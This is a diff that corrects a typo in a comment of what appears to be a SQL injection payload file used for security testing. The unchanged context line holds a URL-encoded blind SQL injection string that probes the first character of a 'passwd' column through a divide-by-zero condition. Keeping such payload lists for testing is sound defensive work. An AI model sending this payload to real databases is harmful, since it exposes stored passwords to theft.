@@ -1,4 +1,4 @@
-# Not sure of orginal source
+# Not sure of original source
 #  attributed to David Litchfield
 #
 234+%2B+%281+%2F+ASCII%28substring%28passwd%2C1%2C1%29%29-4%29
